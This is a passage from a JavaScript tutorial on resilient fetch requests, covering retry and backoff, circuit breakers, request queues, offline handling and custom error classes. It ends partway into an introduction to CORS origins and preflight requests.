  fallbackUrls = [],
  options = {},
  maxRetries = 2
) {
  const urls = [primaryUrl, ...fallbackUrls];
  let lastError;
  
  for (const url of urls) {
    for (let attempt = 0; attempt < maxRetries; attempt++) {
      try {
        const response = await fetch(url, options);
        
        if (response.ok) {
          return response;
        }
        
        lastError = new Error(`HTTP ${response.status} from ${url}`);
        
      } catch (error) {
        lastError = error;
      }
      
      // Wait before retry
      if (attempt < maxRetries - 1) {
        await new Promise(resolve => setTimeout(resolve, 1000 * (attempt + 1)));
      }
    }
  }
  
  throw lastError;
}

// Usage
const response = await fetchWithFallback(
  'https://primary-api.com/data',
  [
    'https://backup-api.com/data',
    'https://fallback-api.com/data'
  ]
);
```

### Comparison of Backoff Strategies

|Strategy|Delay Pattern|Use Case|
|---|---|---|
|Constant|Same delay each time|Simple, predictable timing|
|Linear|Increases linearly|Moderate load management|
|Exponential|Doubles each time|Aggressive backoff for overloaded servers|
|Full Jitter|Random up to exponential|Prevents thundering herd|
|Decorrelated Jitter|Random with correlation|Better distribution than full jitter|

### Best Practices

1. Always implement exponential backoff for production systems
2. Add jitter to prevent synchronized retries from multiple clients
3. Respect Retry-After headers from servers
4. Don't retry on client errors (4xx) except 408, 429
5. Always retry on transient network errors
6. Set reasonable maximum retry attempts and delays
7. Consider circuit breakers for frequently failing services
8. Log retry attempts for monitoring and debugging
9. Use timeouts to prevent indefinite waiting
10. Implement proper error handling for exhausted retries

### Common Retryable Conditions

**Always Retry:**

- 408 Request Timeout
- 429 Too Many Requests
- 500 Internal Server Error
- 502 Bad Gateway
- 503 Service Unavailable
- 504 Gateway Timeout
- Network errors (TypeError from fetch)
- Connection timeouts

**Never Retry:**

- 400 Bad Request
- 401 Unauthorized
- 403 Forbidden
- 404 Not Found
- 405 Method Not Allowed
- Any other 4xx client errors

---

## Error Recovery Patterns

Error recovery patterns for the Fetch API involve strategies to handle failures gracefully, retry failed requests, implement fallback mechanisms, and maintain application resilience when network requests fail.

### Types of Errors in Fetch

Fetch can fail in multiple ways, each requiring different handling strategies:

**Network Errors**: Connection failures, timeouts, DNS failures (fetch rejects) **HTTP Errors**: 4xx, 5xx status codes (fetch resolves, but `response.ok` is false) **Parsing Errors**: Invalid JSON, corrupt blobs **Timeout Errors**: Request takes too long **Abort Errors**: Request cancelled by user or code

### Basic Error Detection Pattern

```javascript
async function fetchWithErrorDetection(url) {
  try {
    const response = await fetch(url);
    
    // Check HTTP status
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    // Parse response
    const data = await response.json();
    return data;
    
  } catch (error) {
    // Network error or parsing error
    if (error.name === 'TypeError') {
      throw new Error('Network error occurred');
    }
    throw error;
  }
}
```

### Retry Pattern with Exponential Backoff

Automatically retry failed requests with increasing delays:

```javascript
async function fetchWithRetry(url, options = {}, maxRetries = 3) {
  let lastError;
  
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url, options);
      
      if (!response.ok) {
        // Don't retry client errors (4xx)
        if (response.status >= 400 && response.status < 500) {
          throw new Error(`Client error: ${response.status}`);
        }
        // Retry server errors (5xx)
        throw new Error(`Server error: ${response.status}`);
      }
      
      return response;
      
    } catch (error) {
      lastError = error;
      
      // Don't retry on last attempt
      if (i === maxRetries - 1) break;
      
      // Exponential backoff: 1s, 2s, 4s, 8s...
      const delay = Math.pow(2, i) * 1000;
      console.log(`Retry attempt ${i + 1} after ${delay}ms`);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
  
  throw new Error(`Failed after ${maxRetries} retries: ${lastError.message}`);
}

// Usage
try {
  const response = await fetchWithRetry('/api/data');
  const data = await response.json();
} catch (error) {
  console.error('All retries failed:', error);
}
```

### Advanced Retry with Configurable Strategy

```javascript
class RetryStrategy {
  constructor(config = {}) {
    this.maxRetries = config.maxRetries || 3;
    this.initialDelay = config.initialDelay || 1000;
    this.maxDelay = config.maxDelay || 30000;
    this.backoffMultiplier = config.backoffMultiplier || 2;
    this.retryableStatuses = config.retryableStatuses || [408, 429, 500, 502, 503, 504];
    this.shouldRetry = config.shouldRetry || this.defaultShouldRetry.bind(this);
  }
  
  defaultShouldRetry(error, response, attempt) {
    // Don't retry if max attempts reached
    if (attempt >= this.maxRetries) return false;
    
    // Retry network errors
    if (error && error.name === 'TypeError') return true;
    
    // Retry specific HTTP status codes
    if (response && this.retryableStatuses.includes(response.status)) {
      return true;
    }
    
    return false;
  }
  
  getDelay(attempt) {
    const delay = this.initialDelay * Math.pow(this.backoffMultiplier, attempt);
    const jitter = Math.random() * 0.3 * delay; // Add 0-30% jitter
    return Math.min(delay + jitter, this.maxDelay);
  }
  
  async execute(fetchFn) {
    let attempt = 0;
    let lastError;
    let lastResponse;
    
    while (attempt < this.maxRetries) {
      try {
        const response = await fetchFn();
        
        if (!response.ok) {
          lastResponse = response;
          
          if (!this.shouldRetry(null, response, attempt)) {
            return response;
          }
          
          throw new Error(`HTTP ${response.status}`);
        }
        
        return response;
        
      } catch (error) {
        lastError = error;
        
        if (!this.shouldRetry(error, lastResponse, attempt)) {
          throw error;
        }
        
        const delay = this.getDelay(attempt);
        console.log(`Retry ${attempt + 1}/${this.maxRetries} after ${delay.toFixed(0)}ms`);
        
        await new Promise(resolve => setTimeout(resolve, delay));
        attempt++;
      }
    }
    
    throw lastError || new Error('Max retries exceeded');
  }
}

// Usage
const retry = new RetryStrategy({
  maxRetries: 5,
  initialDelay: 500,
  retryableStatuses: [429, 500, 502, 503, 504]
});

const response = await retry.execute(() => fetch('/api/data'));
const data = await response.json();
```

### Timeout Pattern

Implement request timeouts since fetch doesn't have built-in timeout support:

```javascript
async function fetchWithTimeout(url, options = {}, timeout = 5000) {
  const controller = new AbortController();
  const signal = controller.signal;
  
  const timeoutId = setTimeout(() => controller.abort(), timeout);
  
  try {
    const response = await fetch(url, {
      ...options,
      signal
    });
    
    clearTimeout(timeoutId);
    return response;
    
  } catch (error) {
    clearTimeout(timeoutId);
    
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  }
}

// Combine with retry
async function fetchWithTimeoutAndRetry(url, options = {}) {
  return fetchWithRetry(
    url,
    { ...options, timeout: 5000 },
    3
  );
}
```

### Circuit Breaker Pattern

Prevent cascading failures by stopping requests after repeated failures:

```javascript
class CircuitBreaker {
  constructor(options = {}) {
    this.failureThreshold = options.failureThreshold || 5;
    this.resetTimeout = options.resetTimeout || 60000;
    this.monitoringPeriod = options.monitoringPeriod || 10000;
    
    this.state = 'CLOSED'; // CLOSED, OPEN, HALF_OPEN
    this.failures = 0;
    this.nextAttempt = Date.now();
    this.recentRequests = [];
  }
  
  recordSuccess() {
    this.failures = 0;
    if (this.state === 'HALF_OPEN') {
      this.state = 'CLOSED';
      console.log('Circuit breaker closed');
    }
    this.cleanupRecentRequests();
  }
  
  recordFailure() {
    this.failures++;
    this.recentRequests.push(Date.now());
    this.cleanupRecentRequests();
    
    const recentFailures = this.recentRequests.length;
    
    if (this.state === 'HALF_OPEN' || recentFailures >= this.failureThreshold) {
      this.state = 'OPEN';
      this.nextAttempt = Date.now() + this.resetTimeout;
      console.log(`Circuit breaker opened. Next attempt at ${new Date(this.nextAttempt)}`);
    }
  }
  
  cleanupRecentRequests() {
    const cutoff = Date.now() - this.monitoringPeriod;
    this.recentRequests = this.recentRequests.filter(time => time > cutoff);
  }
  
  canAttempt() {
    if (this.state === 'CLOSED') return true;
    
    if (this.state === 'OPEN' && Date.now() >= this.nextAttempt) {
      this.state = 'HALF_OPEN';
      console.log('Circuit breaker half-open, trying one request');
      return true;
    }
    
    return this.state === 'HALF_OPEN';
  }
  
  async execute(fetchFn) {
    if (!this.canAttempt()) {
      throw new Error('Circuit breaker is OPEN');
    }
    
    try {
      const result = await fetchFn();
      this.recordSuccess();
      return result;
    } catch (error) {
      this.recordFailure();
      throw error;
    }
  }
}

// Usage
const breaker = new CircuitBreaker({
  failureThreshold: 3,
  resetTimeout: 30000,
  monitoringPeriod: 10000
});

async function makeRequest(url) {
  try {
    return await breaker.execute(async () => {
      const response = await fetch(url);
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      return await response.json();
    });
  } catch (error) {
    console.error('Request failed:', error.message);
    throw error;
  }
}
```

### Fallback Pattern

Provide alternative data sources or cached responses:

```javascript
async function fetchWithFallback(primaryUrl, fallbackUrl, cacheKey) {
  // Try primary source
  try {
    const response = await fetchWithTimeout(primaryUrl, {}, 3000);
    if (response.ok) {
      const data = await response.json();
      // Cache the result
      localStorage.setItem(cacheKey, JSON.stringify({
        data,
        timestamp: Date.now()
      }));
      return data;
    }
  } catch (error) {
    console.warn('Primary source failed:', error.message);
  }
  
  // Try fallback source
  if (fallbackUrl) {
    try {
      const response = await fetchWithTimeout(fallbackUrl, {}, 3000);
      if (response.ok) {
        return await response.json();
      }
    } catch (error) {
      console.warn('Fallback source failed:', error.message);
    }
  }
  
  // Try cache
  const cached = localStorage.getItem(cacheKey);
  if (cached) {
    const { data, timestamp } = JSON.parse(cached);
    const age = Date.now() - timestamp;
    if (age < 3600000) { // Cache valid for 1 hour
      console.log('Using cached data');
      return data;
    }
  }
  
  throw new Error('All sources failed and no valid cache available');
}

// Usage
const data = await fetchWithFallback(
  '/api/primary/data',
  '/api/backup/data',
  'data-cache-key'
);
```

### Queue Pattern for Rate Limiting

Handle rate-limited APIs by queuing requests:

```javascript
class RequestQueue {
  constructor(options = {}) {
    this.maxConcurrent = options.maxConcurrent || 5;
    this.minInterval = options.minInterval || 100;
    this.queue = [];
    this.active = 0;
    this.lastRequest = 0;
  }
  
  async enqueue(fetchFn) {
    return new Promise((resolve, reject) => {
      this.queue.push({ fetchFn, resolve, reject });
      this.process();
    });
  }
  
  async process() {
    if (this.active >= this.maxConcurrent || this.queue.length === 0) {
      return;
    }
    
    // Enforce minimum interval
    const now = Date.now();
    const timeSinceLastRequest = now - this.lastRequest;
    if (timeSinceLastRequest < this.minInterval) {
      setTimeout(() => this.process(), this.minInterval - timeSinceLastRequest);
      return;
    }
    
    const { fetchFn, resolve, reject } = this.queue.shift();
    this.active++;
    this.lastRequest = Date.now();
    
    try {
      const result = await fetchFn();
      resolve(result);
    } catch (error) {
      reject(error);
    } finally {
      this.active--;
      this.process();
    }
  }
}

// Usage
const queue = new RequestQueue({
  maxConcurrent: 3,
  minInterval: 200
});

async function makeQueuedRequest(url) {
  return queue.enqueue(async () => {
    const response = await fetch(url);
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return await response.json();
  });
}

// Make many requests that will be automatically queued
const requests = Array.from({ length: 20 }, (_, i) => 
  makeQueuedRequest(`/api/items/${i}`)
);
const results = await Promise.all(requests);
```

### Graceful Degradation Pattern

```javascript
class ResilientFetcher {
  constructor() {
    this.features = {
      json: true,
      images: true,
      polling: true
    };
    this.degradationLevel = 0;
  }
  
  async fetch(url, options = {}) {
    try {
      const response = await fetchWithRetry(url, options, 3);
      
      if (response.ok) {
        this.resetDegradation();
        return response;
      }
      
      this.increaseDegradation();
      throw new Error(`HTTP ${response.status}`);
      
    } catch (error) {
      this.increaseDegradation();
      throw error;
    }
  }
  
  increaseDegradation() {
    this.degradationLevel++;
    
    if (this.degradationLevel > 10) {
      this.features.polling = false;
      console.log('Disabled polling due to repeated failures');
    }
    
    if (this.degradationLevel > 20) {
      this.features.images = false;
      console.log('Disabled image loading');
    }
    
    if (this.degradationLevel > 50) {
      this.features.json = false;
      console.log('Critical degradation: using minimal mode');
    }
  }
  
  resetDegradation() {
    if (this.degradationLevel > 0) {
      this.degradationLevel = Math.max(0, this.degradationLevel - 1);
      
      if (this.degradationLevel < 10) {
        this.features.polling = true;
      }
      if (this.degradationLevel < 20) {
        this.features.images = true;
      }
      if (this.degradationLevel < 50) {
        this.features.json = true;
      }
    }
  }
  
  shouldLoadFeature(feature) {
    return this.features[feature];
  }
}

// Usage
const fetcher = new ResilientFetcher();

if (fetcher.shouldLoadFeature('images')) {
  await fetcher.fetch('/api/images');
}
```

### Comprehensive Error Recovery System

```javascript
class FetchManager {
  constructor(config = {}) {
    this.retry = new RetryStrategy(config.retry);
    this.breaker = new CircuitBreaker(config.breaker);
    this.queue = new RequestQueue(config.queue);
    this.cache = new Map();
    this.defaultTimeout = config.timeout || 10000;
  }
  
  async fetch(url, options = {}) {
    const cacheKey = `${url}-${JSON.stringify(options)}`;
    
    // Check cache first
    if (options.cache !== 'no-cache') {
      const cached = this.getFromCache(cacheKey);
      if (cached) return cached;
    }
    
    // Execute with all recovery patterns
    return this.queue.enqueue(async () => {
      return this.breaker.execute(async () => {
        return this.retry.execute(async () => {
          const controller = new AbortController();
          const timeout = setTimeout(
            () => controller.abort(),
            options.timeout || this.defaultTimeout
          );
          
          try {
            const response = await fetch(url, {
              ...options,
              signal: controller.signal
            });
            
            clearTimeout(timeout);
            
            if (!response.ok) {
              throw new Error(`HTTP ${response.status}: ${response.statusText}`);
            }
            
            // Cache successful response
            const cloned = response.clone();
            this.addToCache(cacheKey, cloned);
            
            return response;
            
          } catch (error) {
            clearTimeout(timeout);
            
            if (error.name === 'AbortError') {
              throw new Error('Request timeout');
            }
            
            throw error;
          }
        });
      });
    });
  }
  
  getFromCache(key) {
    const cached = this.cache.get(key);
    if (!cached) return null;
    
    const age = Date.now() - cached.timestamp;
    if (age > 300000) { // 5 minutes
      this.cache.delete(key);
      return null;
    }
    
    return cached.response.clone();
  }
  
  addToCache(key, response) {
    this.cache.set(key, {
      response: response.clone(),
      timestamp: Date.now()
    });
    
    // Limit cache size
    if (this.cache.size > 100) {
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
  }
  
  clearCache() {
    this.cache.clear();
  }
}

// Usage
const manager = new FetchManager({
  retry: { maxRetries: 3, initialDelay: 1000 },
  breaker: { failureThreshold: 5, resetTimeout: 60000 },
  queue: { maxConcurrent: 5, minInterval: 100 },
  timeout: 5000
});

try {
  const response = await manager.fetch('/api/data');
  const data = await response.json();
  console.log(data);
} catch (error) {
  console.error('Request failed after all recovery attempts:', error);
  // Show user-friendly error message
}
```

### User Experience Patterns

```javascript
async function fetchWithUserFeedback(url, statusElement) {
  const retry = new RetryStrategy({ maxRetries: 3 });
  
  statusElement.textContent = 'Loading...';
  statusElement.className = 'loading';
  
  try {
    const response = await retry.execute(async () => {
      try {
        return await fetchWithTimeout(url, {}, 5000);
      } catch (error) {
        statusElement.textContent = 'Retrying...';
        throw error;
      }
    });
    
    const data = await response.json();
    
    statusElement.textContent = 'Success!';
    statusElement.className = 'success';
    
    return data;
    
  } catch (error) {
    statusElement.textContent = 'Failed to load. Please try again.';
    statusElement.className = 'error';
    
    throw error;
  }
}
```

### Offline Detection and Recovery

```javascript
class OfflineHandler {
  constructor() {
    this.isOnline = navigator.onLine;
    this.pendingRequests = [];
    
    window.addEventListener('online', () => this.handleOnline());
    window.addEventListener('offline', () => this.handleOffline());
  }
  
  handleOnline() {
    console.log('Connection restored');
    this.isOnline = true;
    this.retryPendingRequests();
  }
  
  handleOffline() {
    console.log('Connection lost');
    this.isOnline = false;
  }
  
  async fetch(url, options = {}) {
    if (!this.isOnline) {
      return new Promise((resolve, reject) => {
        this.pendingRequests.push({ url, options, resolve, reject });
        console.log('Request queued for when connection is restored');
      });
    }
    
    try {
      const response = await fetch(url, options);
      return response;
    } catch (error) {
      if (error.name === 'TypeError' && !navigator.onLine) {
        return new Promise((resolve, reject) => {
          this.pendingRequests.push({ url, options, resolve, reject });
        });
      }
      throw error;
    }
  }
  
  async retryPendingRequests() {
    const requests = [...this.pendingRequests];
    this.pendingRequests = [];
    
    for (const { url, options, resolve, reject } of requests) {
      try {
        const response = await fetch(url, options);
        resolve(response);
      } catch (error) {
        reject(error);
      }
    }
  }
}

// Usage
const offlineHandler = new OfflineHandler();

async function makeRequest(url) {
  try {
    const response = await offlineHandler.fetch(url);
    return await response.json();
  } catch (error) {
    console.error('Request failed:', error);
  }
}
```

---

## Custom Error Classes

Custom error classes extend JavaScript's built-in `Error` class to create domain-specific error types with additional properties, behaviors, and semantic meaning for different failure scenarios.

### Basic Custom Error Implementation

```javascript
class ValidationError extends Error {
  constructor(message) {
    super(message);
    this.name = 'ValidationError';
  }
}

throw new ValidationError('Invalid email format');
```

### The Constructor Pattern

#### Calling super()

The `super(message)` call is mandatory and must occur before accessing `this`. It invokes the parent Error constructor to set up the error message and stack trace.

```javascript
class CustomError extends Error {
  constructor(message) {
    super(message); // Must be first
    this.name = 'CustomError';
    this.timestamp = Date.now();
  }
}
```

#### Setting the name Property

The `name` property determines how the error appears in stack traces and console output. Set it to match the class name for clarity.

```javascript
class DatabaseError extends Error {
  constructor(message) {
    super(message);
    this.name = 'DatabaseError'; // Shows as "DatabaseError:" in stack traces
  }
}
```

### Stack Trace Manipulation

#### Error.captureStackTrace()

Node.js and V8-based environments provide `Error.captureStackTrace()` to exclude the constructor from the stack trace:

```javascript
class ApplicationError extends Error {
  constructor(message) {
    super(message);
    this.name = 'ApplicationError';
    Error.captureStackTrace(this, this.constructor);
  }
}
```

This removes the constructor call itself from the stack, making traces cleaner by starting at the throw site.

#### Stack Property Behavior

[Inference: Based on Error specification behavior] The `stack` property is typically set automatically when the Error is created. Modifying it manually is possible but rarely necessary:

```javascript
const error = new CustomError('Failed');
console.log(error.stack); // Includes file, line, and call stack
```

### Adding Custom Properties

#### Simple Property Addition

```javascript
class HTTPError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.name = 'HTTPError';
    this.statusCode = statusCode;
    this.timestamp = new Date().toISOString();
  }
}

throw new HTTPError('Not Found', 404);
```

#### Complex Contextual Data

```javascript
class QueryError extends Error {
  constructor(message, query, params) {
    super(message);
    this.name = 'QueryError';
    this.query = query;
    this.params = params;
    this.executedAt = Date.now();
  }
}

throw new QueryError(
  'Invalid SQL syntax',
  'SELECT * FROM users WHERE id = ?',
  [undefined]
);
```

#### Nested Error Information

```javascript
class APIError extends Error {
  constructor(message, originalError, context) {
    super(message);
    this.name = 'APIError';
    this.originalError = originalError;
    this.context = context;
    this.retryable = this.determineRetryability(originalError);
  }

  determineRetryability(error) {
    const retryableCodes = [408, 429, 500, 502, 503, 504];
    return retryableCodes.includes(error.statusCode);
  }
}
```

### Error Hierarchies

#### Creating Error Families

```javascript
class ApplicationError extends Error {
  constructor(message) {
    super(message);
    this.name = 'ApplicationError';
  }
}

class ValidationError extends ApplicationError {
  constructor(message, field) {
    super(message);
    this.name = 'ValidationError';
    this.field = field;
  }
}

class AuthenticationError extends ApplicationError {
  constructor(message, userId) {
    super(message);
    this.name = 'AuthenticationError';
    this.userId = userId;
  }
}

class AuthorizationError extends ApplicationError {
  constructor(message, requiredPermission) {
    super(message);
    this.name = 'AuthorizationError';
    this.requiredPermission = requiredPermission;
  }
}
```

#### Multi-Level Hierarchies

```javascript
class NetworkError extends Error {
  constructor(message) {
    super(message);
    this.name = 'NetworkError';
  }
}

class TimeoutError extends NetworkError {
  constructor(message, timeout) {
    super(message);
    this.name = 'TimeoutError';
    this.timeout = timeout;
  }
}

class ConnectionError extends NetworkError {
  constructor(message, host, port) {
    super(message);
    this.name = 'ConnectionError';
    this.host = host;
    this.port = port;
  }
}
```

### Error Detection and Handling

#### instanceof Checking

```javascript
try {
  // some operation
} catch (error) {
  if (error instanceof ValidationError) {
    console.log(`Validation failed on field: ${error.field}`);
  } else if (error instanceof AuthenticationError) {
    console.log(`Auth failed for user: ${error.userId}`);
  } else if (error instanceof ApplicationError) {
    console.log('Application error:', error.message);
  } else {
    console.log('Unexpected error:', error);
  }
}
```

#### Checking Error Hierarchies

```javascript
class DatabaseError extends Error {
  constructor(message) {
    super(message);
    this.name = 'DatabaseError';
  }
}

class QueryError extends DatabaseError {
  constructor(message, query) {
    super(message);
    this.name = 'QueryError';
    this.query = query;
  }
}

try {
  throw new QueryError('Syntax error', 'SELECT * FORM users');
} catch (error) {
  console.log(error instanceof QueryError);      // true
  console.log(error instanceof DatabaseError);   // true
  console.log(error instanceof Error);           // true
}
```

#### Name-Based Detection

```javascript
try {
  // operation
} catch (error) {
  switch (error.name) {
    case 'ValidationError':
      handleValidation(error);
      break;
    case 'NetworkError':
      handleNetwork(error);
      break;
    default:
      handleUnknown(error);
  }
}
```

### Advanced Patterns

#### Error Factory Functions

```javascript
class RequestError extends Error {
  constructor(message, statusCode, requestId) {
    super(message);
    this.name = 'RequestError';
    this.statusCode = statusCode;
    this.requestId = requestId;
  }

  static badRequest(message, requestId) {
    return new RequestError(message, 400, requestId);
  }

  static unauthorized(message, requestId) {
    return new RequestError(message, 401, requestId);
  }

  static forbidden(message, requestId) {
    return new RequestError(message, 403, requestId);
  }

  static notFound(message, requestId) {
    return new RequestError(message, 404, requestId);
  }
}

throw RequestError.notFound('User not found', 'req-12345');
```

#### Error Serialization

```javascript
class SerializableError extends Error {
  constructor(message, code, details) {
    super(message);
    this.name = 'SerializableError';
    this.code = code;
    this.details = details;
  }

  toJSON() {
    return {
      name: this.name,
      message: this.message,
      code: this.code,
      details: this.details,
      stack: this.stack
    };
  }

  static fromJSON(json) {
    const error = new SerializableError(
      json.message,
      json.code,
      json.details
    );
    error.stack = json.stack;
    return error;
  }
}

const error = new SerializableError('Failed', 'ERR_001', { field: 'email' });
const json = JSON.stringify(error);
const restored = SerializableError.fromJSON(JSON.parse(json));
```

#### Error Wrapping

```javascript
class WrappedError extends Error {
  constructor(message, cause) {
    super(message);
    this.name = 'WrappedError';
    this.cause = cause;
  }

  getFullMessage() {
    let msg = this.message;
    let current = this.cause;
    while (current) {
      msg += `\nCaused by: ${current.message}`;
      current = current.cause;
    }
    return msg;
  }
}

try {
  try {
    throw new Error('Database connection failed');
  } catch (dbError) {
    throw new WrappedError('Failed to fetch user', dbError);
  }
} catch (error) {
  console.log(error.getFullMessage());
  // "Failed to fetch user
  // Caused by: Database connection failed"
}
```

### Error Cause Support

Modern JavaScript (ES2022) includes native `cause` support:

```javascript
class ModernError extends Error {
  constructor(message, options) {
    super(message, options); // Pass options including cause
    this.name = 'ModernError';
  }
}

try {
  throw new Error('Original error');
} catch (originalError) {
  throw new ModernError('Wrapped error', { cause: originalError });
}
```

### Validation Error Patterns

#### Field-Specific Errors

```javascript
class FieldValidationError extends Error {
  constructor(field, value, constraint) {
    super(`${field} validation failed: ${constraint}`);
    this.name = 'FieldValidationError';
    this.field = field;
    this.value = value;
    this.constraint = constraint;
  }
}

throw new FieldValidationError('email', 'notanemail', 'must be valid email');
```

#### Multiple Validation Errors

```javascript
class MultiValidationError extends Error {
  constructor(errors) {
    const message = `${errors.length} validation error(s)`;
    super(message);
    this.name = 'MultiValidationError';
    this.errors = errors;
  }

  addError(field, message) {
    this.errors.push({ field, message });
  }

  hasErrors() {
    return this.errors.length > 0;
  }

  getErrorsForField(field) {
    return this.errors.filter(e => e.field === field);
  }
}

const validationError = new MultiValidationError([
  { field: 'email', message: 'Invalid format' },
  { field: 'password', message: 'Too short' }
]);
```

### HTTP-Specific Error Classes

```javascript
class HTTPError extends Error {
  constructor(message, statusCode, body) {
    super(message);
    this.name = 'HTTPError';
    this.statusCode = statusCode;
    this.body = body;
  }

  get isClientError() {
    return this.statusCode >= 400 && this.statusCode < 500;
  }

  get isServerError() {
    return this.statusCode >= 500;
  }
}

class NotFoundError extends HTTPError {
  constructor(resource) {
    super(`${resource} not found`, 404);
    this.name = 'NotFoundError';
    this.resource = resource;
  }
}

class UnauthorizedError extends HTTPError {
  constructor(message = 'Unauthorized') {
    super(message, 401);
    this.name = 'UnauthorizedError';
  }
}
```

### Async Error Handling

#### Promise Rejection with Custom Errors

```javascript
class AsyncOperationError extends Error {
  constructor(message, operation) {
    super(message);
    this.name = 'AsyncOperationError';
    this.operation = operation;
  }
}

async function fetchData(url) {
  try {
    const response = await fetch(url);
    if (!response.ok) {
      throw new AsyncOperationError(
        `Fetch failed: ${response.statusText}`,
        'fetch'
      );
    }
    return await response.json();
  } catch (error) {
    if (error instanceof AsyncOperationError) {
      throw error;
    }
    throw new AsyncOperationError(
      `Network error: ${error.message}`,
      'fetch'
    );
  }
}
```

#### Error Recovery Metadata

```javascript
class RetryableError extends Error {
  constructor(message, maxRetries = 3, retryDelay = 1000) {
    super(message);
    this.name = 'RetryableError';
    this.maxRetries = maxRetries;
    this.retryDelay = retryDelay;
    this.attempts = 0;
  }

  shouldRetry() {
    return this.attempts < this.maxRetries;
  }

  incrementAttempts() {
    this.attempts++;
  }

  getNextDelay() {
    return this.retryDelay * Math.pow(2, this.attempts); // Exponential backoff
  }
}
```

### TypeScript Integration

```javascript
// JavaScript with JSDoc for type hints
/**
 * @extends {Error}
 */
class TypedError extends Error {
  /**
   * @param {string} message
   * @param {number} code
   * @param {Object} metadata
   */
  constructor(message, code, metadata) {
    super(message);
    this.name = 'TypedError';
    this.code = code;
    this.metadata = metadata;
  }
}
```

### Best Practices

#### Consistent Naming Convention

Use descriptive names ending in "Error":

- `ValidationError`, not `InvalidInput`
- `DatabaseConnectionError`, not `DBFail`

#### Preserve Original Error Information

```javascript
class WrapperError extends Error {
  constructor(message, originalError) {
    super(message);
    this.name = 'WrapperError';
    this.originalError = originalError;
    
    // Preserve original stack trace
    if (originalError && originalError.stack) {
      this.stack = `${this.stack}\nCaused by: ${originalError.stack}`;
    }
  }
}
```

#### Avoid Over-Engineering

Don't create custom error classes for every possible scenario. Group related errors:

```javascript
// Good: One class with error codes
class DatabaseError extends Error {
  constructor(message, code) {
    super(message);
    this.name = 'DatabaseError';
    this.code = code; // 'CONNECTION_FAILED', 'QUERY_TIMEOUT', etc.
  }
}

// Avoid: Separate class for every database issue
// class DatabaseConnectionError extends Error { }
// class DatabaseTimeoutError extends Error { }
// class DatabaseQueryError extends Error { }
```

#### Make Errors Informative

Include context that helps debugging:

```javascript
class ProcessingError extends Error {
  constructor(message, data, stage) {
    super(message);
    this.name = 'ProcessingError';
    this.data = data;
    this.stage = stage;
    this.timestamp = new Date().toISOString();
  }

  toString() {
    return `${this.name} at stage "${this.stage}" (${this.timestamp}): ${this.message}`;
  }
}
```

### Testing Custom Errors

```javascript
// Test that custom errors work correctly
function testCustomError() {
  const error = new ValidationError('Invalid input', 'email');
  
  console.assert(error instanceof Error);
  console.assert(error instanceof ValidationError);
  console.assert(error.name === 'ValidationError');
  console.assert(error.message === 'Invalid input');
  console.assert(error.field === 'email');
  console.assert(error.stack.includes('ValidationError'));
}
```

### Error Logging Integration

```javascript
class LoggableError extends Error {
  constructor(message, severity = 'error', metadata = {}) {
    super(message);
    this.name = 'LoggableError';
    this.severity = severity;
    this.metadata = metadata;
    this.timestamp = Date.now();
  }

  toLogEntry() {
    return {
      timestamp: this.timestamp,
      severity: this.severity,
      name: this.name,
      message: this.message,
      metadata: this.metadata,
      stack: this.stack
    };
  }
}

try {
  throw new LoggableError('Operation failed', 'critical', { userId: 123 });
} catch (error) {
  logger.log(error.toLogEntry());
}
```

---

# CORS (Cross-Origin Resource Sharing)

## CORS Concepts and Mechanics

CORS (Cross-Origin Resource Sharing) is a browser security mechanism that controls how web pages from one origin can access resources from different origins, using HTTP headers to explicitly permit cross-origin requests that would otherwise be blocked by the Same-Origin Policy.

### Origin Definition and Comparison

An origin consists of three components: scheme (protocol), host (domain), and port.

```
https://example.com:443/path?query=value
^^^^^  ^^^^^^^^^^^^ ^^^
scheme    host      port
```

#### Same-Origin Examples

```javascript
// Base: https://example.com:443/page

// Same origin - identical scheme, host, port
https://example.com:443/other
https://example.com/api        // Port 443 implied for https

// Different origins
http://example.com              // Different scheme
https://api.example.com         // Different host (subdomain)
https://example.com:8443        // Different port
https://example.org             // Different domain
```

#### Browser Origin Calculation

```javascript
// Current page origin
console.log(window.location.origin); // "https://example.com"

// URL origin
const url = new URL('https://api.example.com/data');
console.log(url.origin); // "https://api.example.com"

// Origin comparison
const isSameOrigin = window.location.origin === url.origin;
```

### Preflight Requests

Preflight is an OPTIONS request sent before the actual request for certain cross-origin requests to determine if the actual request is safe to send.

#### Conditions Triggering Preflight

##### Non-Simple Methods

```javascript
// Triggers preflight - PUT method
fetch('https://api.example.com/resource', {
  method: 'PUT',
  body: JSON.stringify({ data: 'value' })
});

// Triggers preflight - DELETE method
fetch('https://api.example.com/resource/123', {
  method: 'DELETE'
});

// Triggers preflight - PATCH method
fetch('https://api.example.com/resource/123', {
  method: 'PATCH',
  body: JSON.stringify({ field: 'updated' })
});
```

##### Non-Simple Headers

```javascript
// Triggers preflight - custom header
fetch('https://api.example.com/data', {
  headers: {
    'X-Custom-Header': 'value',
    'Authorization': 'Bearer token'
  }
});

// Triggers preflight - non-simple Content-Type
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ data: 'value' })
});
```

##### Simple Requests (No Preflight)

```javascript
// No preflight - GET with simple headers
fetch('https://api.example.com/data', {
  headers: {
    'Accept': 'application/json'
  }
});

// No preflight - POST with simple Content-Type
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'key=value&other=data'
});

// No preflight - POST with multipart/form-data
const formData = new FormData();
formData.append('file', fileInput.files[0]);
fetch('https://api.example.com/upload', {
  method: 'POST',
  body: formData // Content-Type automatically set
});
```

#### Simple Request Criteria

A request is "simple" and avoids preflight if ALL conditions are met:

1. Method is GET, HEAD, or POST
2. Only simple headers are set:
    - Accept
    - Accept-Language
    - Content-Language
    - Content-Type (with value limitations)
    - Range (with byte-range limitations)
3. Content-Type (if set) is one of:
    - application/x-www-form-urlencoded
    - multipart/form-data
    - text/plain
4. No event listeners on XMLHttpRequest.upload
5. No ReadableStream in the request

#### Preflight Request Flow

```
Client                          Server
  |                               |
  |--- OPTIONS (preflight) ------>|
